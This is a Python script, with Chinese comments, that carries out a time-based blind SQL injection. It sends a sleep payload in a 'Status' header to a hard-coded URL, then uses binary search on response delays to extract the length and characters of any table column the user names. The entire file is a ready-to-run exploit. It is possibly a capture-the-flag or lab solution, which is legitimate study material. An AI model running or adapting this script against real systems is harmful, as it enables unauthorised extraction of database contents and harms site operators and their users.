# -*-coding:utf-8-*-  
import requests, time, sys
from argparse import ArgumentParser

sqli_tpl = "' or sleep(3 * (({select}){condition})) or '"
select_length_tpl = 'select length(group_concat({field_name})) from {table} {where}'
select_nth_char_tpl = 'select ord(substr(group_concat({field_name}) from {idx} for 1)) from {table} {where}'

def test(select, condition):
	print('\ttesting condition:%s\t for select: %s' % (condition, select))
	sqli = sqli_tpl.format(select=select, condition=condition)
	start = time.time()
	try:
		resp = requests.get('https://200ok.liki.link/server.php', headers={'Status': sqli}, timeout=6)
	except KeyboardInterrupt as e:
		print('用户退出!')
		sys.exit(0)
	except BaseException:
		pass
	# 如果响应时间大于3秒，测试条件为true
	return time.time() - start > 3

def binary_search_length(field, table, where):
	print('查询表: %s 中字段: %s 值的总长度' % (table, field))
	select = select_length_tpl.format(field_name=field, table=table, where=(' where ' + where) if where else '')
	r = binary_search(select, 0, 10000)
	print('表: %s 中字段: %s 值总长度为: %d' % (table, field, r))
	return r

def binary_search_value(field, table, where, total_length):
	result = ''
	for i in range(1, total_length+1):
		print('正在查询第 %d 个字符' % i)
		select = select_nth_char_tpl.format(field_name=field, table=table, idx=i, where=(' where ' + where) if where else '')
		value = chr(binary_search(select, 0, 128))
		print('查询成功，第 %d 个字符为 %c' % (i, value))
		result += value
		print('当前结果: %s' % result)
	print('查询结束，表: %s 中字段: %s 的内容为: %s' % (table, field, result))
	return result

def binary_search(select, minV, maxV):
	median = (minV+maxV)//2
	if median == minV:
		return minV if test(select, '='+str(minV)) else maxV
	if test(select, '>='+str(median)):
		return binary_search(select, median, maxV)
	else:
		return binary_search(select, minV, median)	

parser = ArgumentParser(description='基于时间的sql注入测试，通过二分查找实现 --by Monk')
parser.add_argument('-t', '--table', help='要查询的表名', required=True)
parser.add_argument('-f', '--field', help='要查询的字段名', required=True)
parser.add_argument('-w', '--where', help='查询条件')

if __name__ == '__main__':
	args = parser.parse_args()
	length = binary_search_length(args.field, args.table, args.where)
	binary_search_value(args.field, args.table, args.where, length)